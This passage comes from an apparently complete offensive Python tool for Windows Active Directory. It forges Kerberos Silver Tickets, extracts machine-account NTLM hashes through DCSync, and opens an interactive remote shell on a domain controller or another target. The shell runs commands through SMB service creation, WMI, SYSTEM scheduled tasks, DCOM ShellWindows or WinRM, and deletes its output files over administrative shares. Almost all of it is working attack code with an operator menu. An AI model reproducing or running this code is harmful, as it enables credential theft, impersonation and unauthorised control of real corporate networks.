    cipherText = cipher.encrypt(service_key, 2, encoded_enc_ticket, None)

    # -- Build TGS_REP (Silver Ticket is a TGS ticket, not AS_REP) --
    # We use TGS_REP structure for Silver Tickets
    tgsRep                            = TGS_REP()
    tgsRep['msg-type']                = ApplicationTagNumbers.TGS_REP.value
    tgsRep['pvno']                    = 5
    tgsRep['crealm']                  = domain_upper
    tgsRep['cname']                   = noValue
    tgsRep['cname']['name-type']      = PrincipalNameType.NT_PRINCIPAL.value
    tgsRep['cname']['name-string']    = noValue
    tgsRep['cname']['name-string'][0] = target_user

    # *** CRITICAL DIFFERENCE: sname = service_name/target_fqdn ***
    tgsRep['ticket']                           = noValue
    tgsRep['ticket']['tkt-vno']                = ProtocolVersionNumber.pvno.value
    tgsRep['ticket']['realm']                  = domain_upper
    tgsRep['ticket']['sname']                  = noValue
    tgsRep['ticket']['sname']['name-type']     = PrincipalNameType.NT_SRV_INST.value
    tgsRep['ticket']['sname']['name-string']   = noValue
    tgsRep['ticket']['sname']['name-string'][0]= service_name
    tgsRep['ticket']['sname']['name-string'][1]= target_fqdn.upper()
    tgsRep['ticket']['enc-part']               = noValue
    tgsRep['ticket']['enc-part']['etype']      = rc4_etype
    tgsRep['ticket']['enc-part']['kvno']       = 2
    tgsRep['ticket']['enc-part']['cipher']     = cipherText

    # -- Build EncTGSRepPart --
    encTGSRepPart = EncTGSRepPart()
    encTGSRepPart['key']               = noValue
    encTGSRepPart['key']['keytype']    = rc4_etype
    encTGSRepPart['key']['keyvalue']   = session_key_data
    encTGSRepPart['last-req']          = noValue
    encTGSRepPart['last-req'][0]       = noValue
    encTGSRepPart['last-req'][0]['lr-type']  = 0
    encTGSRepPart['last-req'][0]['lr-value'] = KerberosTime.to_asn1(now)
    encTGSRepPart['nonce']             = 0
    encTGSRepPart['key-expiration']    = KerberosTime.to_asn1(renew)
    encTGSRepPart['flags']             = encodeFlags(flags)
    encTGSRepPart['authtime']          = KerberosTime.to_asn1(now)
    encTGSRepPart['starttime']         = KerberosTime.to_asn1(now)
    encTGSRepPart['endtime']           = KerberosTime.to_asn1(end)
    encTGSRepPart['renew-till']        = KerberosTime.to_asn1(renew)
    encTGSRepPart['srealm']            = domain_upper
    encTGSRepPart['sname']             = noValue
    encTGSRepPart['sname']['name-type']      = PrincipalNameType.NT_SRV_INST.value
    encTGSRepPart['sname']['name-string']    = noValue
    encTGSRepPart['sname']['name-string'][0] = service_name
    encTGSRepPart['sname']['name-string'][1] = target_fqdn.upper()

    session_key_obj     = Key(rc4_etype, session_key_data)
    encoded_enc_rep     = encoder.encode(encTGSRepPart)
    enc_rep_cipherText  = cipher.encrypt(session_key_obj, 3, encoded_enc_rep, None)

    tgsRep['enc-part']          = noValue
    tgsRep['enc-part']['etype'] = rc4_etype
    tgsRep['enc-part']['kvno']  = 2
    tgsRep['enc-part']['cipher']= enc_rep_cipherText

    # -- Save CCache --
    encoded_tgs_rep = encoder.encode(tgsRep)
    ccache          = CCache()

    # Silver Ticket is a TGS (service ticket), not a TGT.
    # Use fromTGS() which decodes with TGS_REP (tag 13), not AS_REP (tag 11).
    if hasattr(CCache, 'fromTGS'):
        ccache.fromTGS(encoded_tgs_rep, session_key_obj, session_key_obj)
    else:
        # Fallback for older Impacket versions: manual decode + CCache build
        from pyasn1.codec.ber import decoder
        from impacket.krb5.ccache import Credential, CCacheHeader
        from impacket.krb5.types import Principal
        decodedTGS = decoder.decode(encoded_tgs_rep, asn1Spec=TGS_REP())[0]
        principal = Principal()
        principal.from_asn1(decodedTGS, 'crealm', 'cname')
        ccache._header = CCacheHeader()
        ccache._header['principal'] = principal
        ccache._principal = principal
        # Build the credential for the service ticket
        credential = Credential()
        credential['client'] = principal
        credential['server'] = Principal()
        credential['server'].from_asn1(decodedTGS['ticket'], 'realm', 'sname')
        credential['key']['keytype'] = rc4_etype
        credential['key']['keyvalue'] = session_key_data
        credential['time']['authtime']   = int(now.timestamp())
        credential['time']['starttime']  = int(now.timestamp())
        credential['time']['endtime']    = int(end.timestamp())
        credential['time']['renew_till'] = int(renew.timestamp())
        credential['is_skey'] = 0
        credential['ticket'] = encoded_tgs_rep
        ccache._credentials.append(credential)

    output    = output_path if output_path.endswith('.ccache') else f"{output_path}.ccache"
    directory = os.path.dirname(output)
    if directory:
        os.makedirs(directory, exist_ok=True)

    ccache.saveFile(output)
    return output


def create_silver_ticket(domain, service_hash_hex, domain_sid_str, target_user,
                         service_name, target_fqdn, output_path):
    """
    Wrapper to forge a Silver Ticket.
    """
    try:
        print(Fore.YELLOW + f"[*] Forging Silver Ticket for: {service_name}/{target_fqdn}" + Style.RESET_ALL)
        print(Fore.YELLOW + f"[*] Impersonating user: {target_user}" + Style.RESET_ALL)
        print(Fore.YELLOW + f"[*] Using service key (NTLM): {service_hash_hex[:16]}...{service_hash_hex[-8:]}" + Style.RESET_ALL)

        pacInfos = build_pac_infos(domain, domain_sid_str, target_user)

        output = sign_encrypt_silver_ticket(
            domain, domain_sid_str, target_user,
            service_hash_hex, pacInfos, output_path,
            service_name, target_fqdn
        )

        print(Fore.GREEN + f"[+] Silver Ticket saved: {output}" + Style.RESET_ALL)
        print(Fore.GREEN + f"[+] Service: {service_name}/{target_fqdn}" + Style.RESET_ALL)
        return output

    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
        sys.exit(0)
    except Exception as e:
        print(Fore.RED + f"[-] Silver Ticket creation failed: {e}" + Style.RESET_ALL)
        import traceback
        print(Fore.RED + traceback.format_exc() + Style.RESET_ALL)
        return None


# ============================================================
# Remote Shell
# ============================================================
class RemoteShell:
    ALIASES = {
        'ls'      : 'dir',
        'cat'     : 'type',
        'pwd'     : 'cd',
        'clear'   : 'cls',
        'rm'      : 'del',
        'cp'      : 'copy',
        'mv'      : 'move',
        'ps'      : 'tasklist',
        'ifconfig': 'ipconfig',
        'id'      : 'whoami /all',
        'env'     : 'set',
        'grep'    : 'findstr',
        'kill'    : 'taskkill /PID',
    }

    def __init__(self, dc_ip, domain, target_user, ccache_path, dc_hostname):
        self.dc_ip       = dc_ip
        self.domain      = domain
        self.target_user = target_user
        self.ccache_path = ccache_path
        self.dc_hostname = dc_hostname if '.' in dc_hostname else f"{dc_hostname}.{domain}"
        self._smb        = None
        self._exec       = None

    def _random_name(self, length=8):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def _translate(self, cmd):
        parts = cmd.strip().split(' ', 1)
        alias = parts[0].lower()
        if alias in self.ALIASES:
            rest = (' ' + parts[1]) if len(parts) > 1 else ''
            return self.ALIASES[alias] + rest
        return cmd

    def _sync_time(self):
        print(Fore.YELLOW + "[*] Syncing time with DC to avoid clock skew..." + Style.RESET_ALL)

        try:
            r = subprocess.run(
                ['sudo', 'ntpdate', '-u', self.dc_ip],
                capture_output=True, text=True, timeout=10
            )
            if r.returncode == 0:
                print(Fore.GREEN + "[+] Time synced via ntpdate." + Style.RESET_ALL)
                return True
        except Exception:
            pass

        try:
            r = subprocess.run(
                ['sudo', 'rdate', '-n', self.dc_ip],
                capture_output=True, text=True, timeout=10
            )
            if r.returncode == 0:
                print(Fore.GREEN + "[+] Time synced via rdate." + Style.RESET_ALL)
                return True
        except Exception:
            pass

        try:
            r = subprocess.run(
                ['sudo', 'net', 'time', 'set', '-S', self.dc_ip],
                capture_output=True, text=True, timeout=10
            )
            if r.returncode == 0:
                print(Fore.GREEN + "[+] Time synced via net time." + Style.RESET_ALL)
                return True
        except Exception:
            pass

        try:
            import socket
            s = socket.create_connection((self.dc_ip, 445), timeout=5)

            from impacket.smbconnection import SMBConnection as _SMB
            _smb_tmp = _SMB(self.dc_ip, self.dc_ip)
            _smb_tmp.negotiateSession()
            server_time = _smb_tmp.getSMBServer().get_server_date()
            _smb_tmp.close()

            if server_time:
                dc_ts  = server_time.timestamp()
                our_ts = time.time()
                skew   = dc_ts - our_ts
                print(Fore.YELLOW + f"[*] Clock skew with DC: {skew:+.1f} seconds" + Style.RESET_ALL)

                if abs(skew) > 300:
                    print(Fore.YELLOW + "[!] Skew > 5 min — trying sudo date..." + Style.RESET_ALL)
                    dc_date = server_time.strftime('%Y-%m-%d %H:%M:%S')
                    subprocess.run(
                        ['sudo', 'date', '-s', dc_date],
                        capture_output=True, timeout=5
                    )
                else:
                    print(Fore.GREEN + f"[+] Skew {skew:+.1f}s is within Kerberos tolerance." + Style.RESET_ALL)
                    return True
        except Exception:
            pass

        print(Fore.YELLOW + "[!] Could not sync time automatically." + Style.RESET_ALL)
        print(Fore.YELLOW + "    Run manually: sudo ntpdate -u " + self.dc_ip + Style.RESET_ALL)
        return False

    def connect(self):
        os.environ['KRB5CCNAME'] = self.ccache_path
        print(Fore.YELLOW + f"[*] Connecting to {self.dc_hostname}..." + Style.RESET_ALL)
        try:
            self._smb = SMBConnection(self.dc_hostname, self.dc_ip)
            self._smb.kerberosLogin(
                self.target_user, '', self.domain,
                '', '', self.ccache_path,
                kdcHost=self.dc_ip
            )
            print(Fore.GREEN + "[+] Kerberos authentication successful!" + Style.RESET_ALL)
            return True
        except Exception as e:
            err = str(e)

            if 'KRB_AP_ERR_SKEW' in err or 'Clock skew' in err or 'clock skew' in err:
                print(Fore.YELLOW + "[!] Clock skew detected — attempting time sync..." + Style.RESET_ALL)
                self._sync_time()

                try:
                    self._smb = SMBConnection(self.dc_hostname, self.dc_ip)
                    self._smb.kerberosLogin(
                        self.target_user, '', self.domain,
                        '', '', self.ccache_path,
                        kdcHost=self.dc_ip
                    )
                    print(Fore.GREEN + "[+] Kerberos authentication successful!" + Style.RESET_ALL)
                    return True
                except Exception as e2:
                    print(Fore.RED + f"[-] Connection failed after sync: {e2}" + Style.RESET_ALL)
                    print(Fore.YELLOW + "    Fix manually: sudo ntpdate -u " + self.dc_ip + Style.RESET_ALL)
                    return False
            print(Fore.RED + f"[-] Connection failed: {e}" + Style.RESET_ALL)
            return False

    def run(self):
        if not self.connect():
            return

        methods = [
            ("SMB/SMBEXEC",     self._exec_smb),
            ("WMI",             self._exec_wmi),
            ("Scheduled Tasks", self._exec_atexec),
            ("DCOM",            self._exec_dcom),
            ("WinRM",           self._exec_winrm),
        ]

        print(Fore.YELLOW + "\n[*] Trying execution methods..." + Style.RESET_ALL)

        for name, method in methods:
            print(Fore.YELLOW + f"    [~] Trying {name}..." + Style.RESET_ALL)
            try:
                result = method("whoami")
                if result and result.strip():
                    print(Fore.GREEN + f"[+] {name} works! ({result.strip()})" + Style.RESET_ALL)
                    self._exec = method
                    self._interactive(name)
                    return
                else:
                    print(Fore.WHITE + f"    [-] {name}: no output, trying next..." + Style.RESET_ALL)
            except KeyboardInterrupt:
                print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
                sys.exit(0)
            except Exception as e:
                print(Fore.WHITE + f"    [-] {name}: {e}" + Style.RESET_ALL)

        print(Fore.RED + "\n[-] All methods failed!" + Style.RESET_ALL)

    def _interactive(self, method_name):
        print(Fore.CYAN   + f"\n[*] Shell via {method_name}" + Style.RESET_ALL)
        print(Fore.YELLOW + "[*] Linux aliases supported (ls=dir, cat=type, ps=tasklist...)" + Style.RESET_ALL)
        print(Fore.YELLOW + "[*] Type 'exit' to quit\n" + Style.RESET_ALL)

        while True:
            try:
                cmd = input(Fore.WHITE + "C:\\Windows\\system32> " + Style.RESET_ALL).strip()
                if not cmd:
                    continue
                if cmd.lower() in ['exit', 'quit']:
                    print(Fore.YELLOW + "[*] Closing shell..." + Style.RESET_ALL)
                    break

                cmd    = self._translate(cmd)
                output = self._exec(cmd)
                if output:
                    print(output, end='' if output.endswith('\n') else '\n')

            except KeyboardInterrupt:
                print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
                sys.exit(0)
            except EOFError:
                break

        try:
            self._smb.logoff()
        except Exception:
            pass

    # ============================================================
    # Method 1: SMB/SMBEXEC via SCM
    # ============================================================
    def _exec_smb(self, command):
        tmp_name = self._random_name()
        full_cmd = (
            f'cmd.exe /Q /c {command} '
            f'> \\\\127.0.0.1\\ADMIN$\\{tmp_name}.tmp 2>&1'
        )

        string_binding = f'ncacn_np:{self.dc_ip}[\\pipe\\svcctl]'
        trans = transport.DCERPCTransportFactory(string_binding)
        trans.set_smb_connection(self._smb)
        dce = trans.get_dce_rpc()
        dce.connect()
        dce.bind(scmr.MSRPC_UUID_SCMR)

        svc_name   = self._random_name(6).upper()
        scm_handle = scmr.hROpenSCManagerW(dce)['lpScHandle']

        try:
            svc_handle = scmr.hRCreateServiceW(
                dce, scm_handle,
                svc_name, svc_name,
                lpBinaryPathName=full_cmd,
                dwStartType=scmr.SERVICE_DEMAND_START
            )['lpServiceHandle']
        except Exception as e:
            scmr.hRCloseServiceHandle(dce, scm_handle)
            dce.disconnect()
            raise Exception(f"CreateService failed: {e}")

        try:
            scmr.hRStartServiceW(dce, svc_handle)
        except Exception:
            pass

        for _ in range(20):
            time.sleep(0.3)
            try:
                status = scmr.hRQueryServiceStatus(dce, svc_handle)
                if status['lpServiceStatus']['dwCurrentState'] == scmr.SERVICE_STOPPED:
                    break
            except Exception:
                break

        try:
            scmr.hRDeleteService(dce, svc_handle)
            scmr.hRCloseServiceHandle(dce, svc_handle)
        except Exception:
            pass

        scmr.hRCloseServiceHandle(dce, scm_handle)
        dce.disconnect()

        time.sleep(0.5)
        return self._read_file('ADMIN$', f'{tmp_name}.tmp')

    # ============================================================
    # Method 2: WMI via Win32_Process
    # ============================================================
    def _exec_wmi(self, command):
        tmp_name    = self._random_name()
        output_path = f'Windows\\Temp\\{tmp_name}.tmp'
        full_cmd    = f'cmd.exe /Q /c {command} 1> C:\\Windows\\Temp\\{tmp_name}.tmp 2>&1'

        dcom = DCOMConnection(
            self.dc_hostname,
            username=self.target_user,
            password='',
            domain=self.domain,
            lmhash='',
            nthash='',
            aesKey='',
            oxidResolver=True,
            doKerberos=True,
            kdcHost=self.dc_ip
        )

        try:
            iInterface       = dcom.CoCreateInstanceEx(
                wmi.CLSID_WbemLevel1Login,
                wmi.IID_IWbemLevel1Login
            )
            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
            iWbemServices    = iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
            iWbemLevel1Login.RemRelease()

            win32_process, _ = iWbemServices.GetObject('Win32_Process')
            win32_process.Create(full_cmd, 'C:\\Windows\\System32', None)
            time.sleep(2)
        finally:
            try:
                dcom.disconnect()
            except Exception:
                pass

        return self._read_file('C$', output_path)

    # ============================================================
    # Method 3: Scheduled Tasks via TSCH
    # ============================================================
    def _exec_atexec(self, command):
        tmp_name    = self._random_name()
        output_path = f'Windows\\Temp\\{tmp_name}.tmp'
        task_name   = f'\\{self._random_name(6)}'

        cmd_escaped = (command
            .replace('&', '&amp;')
            .replace('<', '&lt;')
            .replace('>', '&gt;')
            .replace('"', '&quot;')
            .replace("'", '&apos;')
        )

        xml = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <ExecutionTimeLimit>PT1H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>cmd.exe</Command>
      <Arguments>/C {cmd_escaped} &gt; C:\\Windows\\Temp\\{tmp_name}.tmp 2&gt;&amp;1</Arguments>
    </Exec>
  </Actions>
</Task>"""

        string_binding = f'ncacn_np:{self.dc_ip}[\\pipe\\atsvc]'
        trans = transport.DCERPCTransportFactory(string_binding)
        trans.set_smb_connection(self._smb)
        dce = trans.get_dce_rpc()
        dce.connect()
        dce.bind(tsch.MSRPC_UUID_TSCHS)

        try:
            tsch.hSchRpcRegisterTask(
                dce, task_name, xml,
                tsch.TASK_CREATE, NULL,
                tsch.TASK_LOGON_NONE
            )
            tsch.hSchRpcRun(dce, task_name)

            for _ in range(20):
                time.sleep(0.5)
                try:
                    resp = tsch.hSchRpcGetLastRunInfo(dce, task_name)
                    if resp['pLastRuntime']['wYear'] != 0:
                        break
                except Exception:
                    break

        finally:
            try:
                tsch.hSchRpcDelete(dce, task_name)
            except Exception:
                pass
            dce.disconnect()

        time.sleep(0.5)
        return self._read_file('C$', output_path)

    # ============================================================
    # Method 4: DCOM via ShellWindows
    # ============================================================
    def _exec_dcom(self, command):
        tmp_name    = self._random_name()
        output_path = f'Windows\\Temp\\{tmp_name}.tmp'

        CLSID_ShellWindows = '9BA05972-F6A8-11CF-A442-00A0C90A8F39'
        IID_IShellWindows  = '85CB6900-4D95-11CF-960C-0080C7F4EE85'
        DISPATCH_METHOD      = 0x1
        DISPATCH_PROPERTYGET = 0x2

        dcom = DCOMConnection(
            self.dc_hostname,
            username=self.target_user,
            password='',
            domain=self.domain,
            lmhash='',
            nthash='',
            aesKey='',
            oxidResolver=True,
            doKerberos=True,
            kdcHost=self.dc_ip
        )

        try:
            from impacket.dcerpc.v5.dcom.oaut import IDispatch, DISPPARAMS, VARIANT

            iShellWindows = dcom.CoCreateInstanceEx(CLSID_ShellWindows, IID_IShellWindows)
            iDispatch     = IDispatch(iShellWindows)

            dispParams                      = DISPPARAMS(None, False)
            dispParams['rgvarg']            = NULL
            dispParams['rgdispidNamedArgs'] = NULL
            dispParams['cArgs']             = 0
            dispParams['cNamedArgs']        = 0

            ids  = iDispatch.GetIDsOfNames(('Item',))
            resp = iDispatch.Invoke(ids[0], 0x0409, DISPATCH_METHOD, dispParams, None, None, None)
            item = IDispatch(resp['pVarResult']['_varUnion']['pdispVal']['abData'])

            ids  = item.GetIDsOfNames(('Document',))
            resp = item.Invoke(ids[0], 0x0409, DISPATCH_PROPERTYGET, dispParams, None, None, None)
            doc  = IDispatch(resp['pVarResult']['_varUnion']['pdispVal']['abData'])

            ids  = doc.GetIDsOfNames(('Application',))
            resp = doc.Invoke(ids[0], 0x0409, DISPATCH_PROPERTYGET, dispParams, None, None, None)
            app  = IDispatch(resp['pVarResult']['_varUnion']['pdispVal']['abData'])

            ids  = app.GetIDsOfNames(('ShellExecute',))

            def make_bstr(s):
                v = VARIANT(None, False)
                v['clSize']                        = 5
                v['vt']                            = 8
                v['_varUnion']['bstrVal']['asData'] = s
                return v

            def make_int(n):
                v = VARIANT(None, False)
                v['clSize']            = 5
                v['vt']               = 3
                v['_varUnion']['lVal'] = n
                return v

            args_dp                      = DISPPARAMS(None, False)
            args_dp['rgdispidNamedArgs'] = NULL
            args_dp['cNamedArgs']        = 0
            args_dp['cArgs']             = 5
            args_dp['rgvarg']            = [
                make_int(0),
                make_bstr('open'),
                make_bstr('C:\\Windows\\System32'),
                make_bstr(f'/Q /c {command} > C:\\Windows\\Temp\\{tmp_name}.tmp 2>&1'),
                make_bstr('cmd.exe'),
            ]

            app.Invoke(ids[0], 0x0409, DISPATCH_METHOD, args_dp, None, None, None)
            time.sleep(2)

        except Exception as e:
            raise Exception(f"DCOM failed: {e}")
        finally:
            try:
                dcom.disconnect()
            except Exception:
                pass

        return self._read_file('C$', output_path)

    # ============================================================
    # Method 5: WinRM
    # ============================================================
    def _exec_winrm(self, command):
        import socket
        import subprocess as _sub

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        result = sock.connect_ex((self.dc_ip, 5985))
        sock.close()

        if result != 0:
            raise Exception("WinRM port 5985 is closed")

        try:
            import pypsrp
        except ImportError:
            print(Fore.YELLOW + "    [*] Installing pypsrp..." + Style.RESET_ALL)
            _sub.run(
                [sys.executable, '-m', 'pip', 'install', 'pypsrp', '-q'],
                capture_output=True
            )
            import pypsrp

        try:
            from pypsrp.client import Client
            client = Client(
                self.dc_hostname,
                username=f"{self.domain}\\{self.target_user}",
                password='',
                auth='kerberos',
                ssl=False,
                port=5985
            )
            stdout, stderr, rc = client.execute_cmd(command)
            return stdout + stderr
        except Exception as e:
            raise Exception(f"WinRM failed: {e}")

    # ============================================================
    # Read output file via SMB
    # ============================================================
    def _read_file(self, share, path):
        for attempt in range(8):
            try:
                tid = self._smb.connectTree(share)
                fid = self._smb.openFile(tid, path)

                output = b''
                offset = 0
                while True:
                    data = self._smb.readFile(tid, fid, offset, 65535)
                    if not data:
                        break
                    output += data
                    offset += len(data)

                self._smb.closeFile(tid, fid)
                try:
                    self._smb.deleteFile(share, path)
                except Exception:
                    pass
                self._smb.disconnectTree(tid)

                return output.decode('cp850', errors='replace')

            except Exception:
                if attempt < 7:
                    time.sleep(0.5)
                    continue
                return ''


# ============================================================
# ccache path validator
# ============================================================
def resolve_existing_ccache(user_input):
    if not user_input:
        return None, "[!] Path cannot be empty!"

    cleaned = user_input.strip()

    if cleaned.startswith('/') and not cleaned.startswith('//'):
        cleaned = cleaned.lstrip('/')

    if os.path.isabs(cleaned):
        full_path = os.path.normpath(cleaned)
    else:
        full_path = os.path.normpath(os.path.join(os.getcwd(), cleaned))

    base = os.path.basename(full_path)
    ext  = os.path.splitext(base)[1].lower() if '.' in base else ''

    if ext and ext != '.ccache':
        return None, (
            f"[!] Invalid file format '{ext}' — only .ccache is accepted.\n"
            f"    Correct example: {os.path.splitext(full_path)[0]}.ccache"
        )

    if not ext:
        full_path += '.ccache'

    if not os.path.exists(full_path):
        directory = os.path.dirname(full_path)
        if not os.path.isdir(directory):
            return None, (
                f"[!] File not found: {full_path}\n"
                f"    Directory does not exist: {directory}"
            )
        return None, f"[!] File not found: {full_path}"

    if not os.path.isfile(full_path):
        return None, f"[!] Not a file: {full_path}"

    return full_path, None


# ============================================================
# Main
# ============================================================
if __name__ == '__main__':
    banner()

    dc_ip = get_input(
        Fore.CYAN + "[?] Enter DC IP Address          : " + Style.RESET_ALL,
        validate_ip, "Invalid IP! Example: 192.168.x.x"
    )

    print(Fore.YELLOW + "[*] Checking DC reachability..." + Style.RESET_ALL)
    if not check_ip_reachable(dc_ip):
        print(Fore.RED + f"[!] Cannot reach {dc_ip}!" + Style.RESET_ALL)
        sys.exit(1)
    print(Fore.GREEN + f"[+] DC {dc_ip} is reachable!" + Style.RESET_ALL)

    domain   = get_input(Fore.CYAN + "[?] Enter Domain Name            : " + Style.RESET_ALL,
                         validate_domain, "Invalid domain! Example: domain.com")
    username = get_input(Fore.CYAN + "[?] Enter Username               : " + Style.RESET_ALL)
    password = get_input(Fore.CYAN + "[?] Enter Password               : " + Style.RESET_ALL)

    print(Fore.YELLOW + "[*] Verifying credentials and domain..." + Style.RESET_ALL)
    result = check_credentials_and_domain(dc_ip, domain, username, password)
    if result == "invalid_credentials":
        print(Fore.RED + "[!] Invalid credentials!" + Style.RESET_ALL)
        sys.exit(1)
    elif not result:
        print(Fore.RED + f"[!] Domain '{domain}' not found!" + Style.RESET_ALL)
        sys.exit(1)
    print(Fore.GREEN + "[+] Credentials verified!" + Style.RESET_ALL)
    print(Fore.GREEN + f"[+] Domain '{domain}' verified!" + Style.RESET_ALL)

    print(Fore.YELLOW + "[*] Checking admin privileges..." + Style.RESET_ALL)
    priv = check_admin_privileges(dc_ip, domain, username, password)
    if priv == "access_denied":
        print(Fore.RED + f"[!] '{username}' has no admin privileges!" + Style.RESET_ALL)
        sys.exit(1)
    elif priv == "invalid_credentials":
        print(Fore.RED + "[!] Invalid credentials on SMB!" + Style.RESET_ALL)
        sys.exit(1)
    elif isinstance(priv, str) and priv.startswith("error"):
        print(Fore.RED + f"[!] Privilege check failed: {priv}" + Style.RESET_ALL)
        sys.exit(1)
    print(Fore.GREEN + f"[+] '{username}' has admin privileges!" + Style.RESET_ALL)

    # --- Auto-detect DC hostname ---
    print(Fore.YELLOW + "[*] Auto-detecting DC hostname..." + Style.RESET_ALL)
    dc_hostname_auto = auto_detect_dc_hostname(dc_ip, domain, username, password)

    if dc_hostname_auto:
        print(Fore.GREEN + f"[+] DC hostname detected: {dc_hostname_auto}" + Style.RESET_ALL)
    else:
        print(Fore.YELLOW + "[!] Could not auto-detect DC hostname." + Style.RESET_ALL)

    dc_hostname = get_input(
        Fore.CYAN   + "[?] Enter DC Hostname (FQDN)     : " + Style.RESET_ALL +
        Fore.YELLOW + f"(default: {dc_hostname_auto}) " if dc_hostname_auto else Fore.YELLOW + "(e.g. DC01.domain.com) " + Style.RESET_ALL,
        allow_empty=True
    ) or dc_hostname_auto

    if not dc_hostname:
        print(Fore.RED + "[!] DC hostname is required!" + Style.RESET_ALL)
        sys.exit(1)

    # Ensure it's a proper FQDN
    if '.' not in dc_hostname:
        dc_hostname = f"{dc_hostname}.{domain}"
    dc_hostname = dc_hostname.lower()

    print(Fore.GREEN + f"[+] Target DC: {dc_hostname} ({dc_ip})" + Style.RESET_ALL)

    # Variables to persist across menu iterations
    service_hash  = None
    domain_sid    = None
    ccache_file   = None
    ticket_user   = None
    target_fqdn   = dc_hostname  # Default target = the DC itself
    service_name  = None
    _cached_services = None

    while True:
        try:
            print(Fore.CYAN + "\n" + "=" * 55 + Style.RESET_ALL)
            print(Fore.CYAN + "  [?] Choose action:" + Style.RESET_ALL)
            print(Fore.WHITE + f"    1. Discover open services (target: {target_fqdn})" + Style.RESET_ALL)
            print(Fore.WHITE + "    2. Extract machine hash & forge Silver Ticket" + Style.RESET_ALL)
            print(Fore.WHITE + "    3. Forge Silver Ticket (manual hash)" + Style.RESET_ALL)
            print(Fore.WHITE + "    4. Open shell with ticket" + Style.RESET_ALL)
            print(Fore.WHITE + "    5. Change target host" + Style.RESET_ALL)
            print(Fore.CYAN + "=" * 55 + Style.RESET_ALL)

            choice = get_input(
                Fore.CYAN + "[?] Your choice                 : " + Style.RESET_ALL,
                lambda x: x in ['1', '2', '3', '4', '5'],
                "Invalid choice! Enter 1, 2, 3, 4, or 5"
            )

            # ==========================================================
            # Option 5: Change target host
            # ==========================================================
            if choice == '5':
                new_target = get_input(
                    Fore.CYAN   + "[?] Enter new target hostname/FQDN: " + Style.RESET_ALL +
                    Fore.YELLOW + f"(current: {target_fqdn}) " + Style.RESET_ALL,
                    allow_empty=True
                )
                if new_target:
                    if '.' not in new_target:
                        new_target = f"{new_target}.{domain}"
                    target_fqdn = new_target.lower()
                    _cached_services = None  # Reset cache
                    print(Fore.GREEN + f"[+] Target changed to: {target_fqdn}" + Style.RESET_ALL)
                continue

            # ==========================================================
            # Option 1: Discover services
            # ==========================================================
            if choice == '1':
                available_services, ldap_spns = discover_services(
                    dc_ip, domain, username, password, target_fqdn
                )
                _cached_services = available_services

                if available_services:
                    print(Fore.GREEN + "\n[+] You can forge a Silver Ticket for any of these services." + Style.RESET_ALL)
                    print(Fore.YELLOW + "    -> Select option 2 to auto-extract the machine hash." + Style.RESET_ALL)
                    print(Fore.YELLOW + "    -> Or option 3 to manually provide the hash." + Style.RESET_ALL)
                else:
                    print(Fore.YELLOW + "\n[!] No services auto-detected, but you can still manually specify one." + Style.RESET_ALL)

            # ==========================================================
            # Option 2: Auto-extract machine hash & forge Silver Ticket
            # ==========================================================
            elif choice == '2':
                # Step 1: Discover services (only if not cached)
                if not _cached_services:
                    available_services, ldap_spns = discover_services(
                        dc_ip, domain, username, password, target_fqdn
                    )
                    _cached_services = available_services
                else:
                    available_services = _cached_services
                    print(Fore.CYAN + f"[*] Using cached service results for {target_fqdn}" + Style.RESET_ALL)

                # Step 2: Let user pick a service
                print(Fore.CYAN + f"\n[?] Select service for Silver Ticket ({target_fqdn}):" + Style.RESET_ALL)
                for key, (svc_class, svc_desc) in SUPPORTED_SERVICES.items():
                    marker = ""
                    if available_services and svc_class.upper() in [s.upper() for s in available_services]:
                        marker = Fore.GREEN + " [DETECTED]" + Style.RESET_ALL
                    print(Fore.WHITE + f"    {key}. {svc_class:8s} — {svc_desc}{marker}" + Style.RESET_ALL)

                print(Fore.WHITE + "    M. Manual entry (custom SPN)" + Style.RESET_ALL)

                svc_choice = get_input(
                    Fore.CYAN + "[?] Service choice              : " + Style.RESET_ALL,
                    lambda x: x.upper() in [str(k) for k in SUPPORTED_SERVICES.keys()] + ['M'],
                    "Invalid choice! Select 1-9, 0, or M"
                )

                if svc_choice.upper() == 'M':
                    service_name = get_input(
                        Fore.CYAN + "[?] Enter service name (e.g. cifs, HTTP, MSSQLSvc): " + Style.RESET_ALL
                    )
                else:
                    service_name = SUPPORTED_SERVICES[svc_choice][0]

                print(Fore.GREEN + f"[+] Selected service: {service_name}" + Style.RESET_ALL)

                # Step 3: Extract machine account NTLM hash via DCSync
                target_computer = target_fqdn.split('.')[0]
                print(Fore.YELLOW + f"\n[*] Extracting NTLM hash for machine account: {target_computer}$" + Style.RESET_ALL)
                print(Fore.YELLOW + "[*] Using DCSync..." + Style.RESET_ALL)

                dumper = ComputerHashDumper(dc_ip, domain, username, password, target_computer)
                success = dumper.dump()

                if not success or not dumper.ntlm_hash:
                    print(Fore.RED + f"[-] Failed to extract NTLM hash for {target_computer}$!" + Style.RESET_ALL)
                    print(Fore.YELLOW + "[*] You can try option 3 to provide the hash manually." + Style.RESET_ALL)
                    continue

                service_hash = dumper.ntlm_hash
                domain_sid   = dumper.domain_sid

                print(Fore.GREEN + f"\n[+] Machine account hash extracted!" + Style.RESET_ALL)
                print(Fore.GREEN + f"    Computer   : {target_computer}$" + Style.RESET_ALL)
                print(Fore.GREEN + f"    NTLM Hash  : {service_hash}" + Style.RESET_ALL)

                if domain_sid:
                    print(Fore.GREEN + f"    Domain SID : {domain_sid}" + Style.RESET_ALL)
                else:
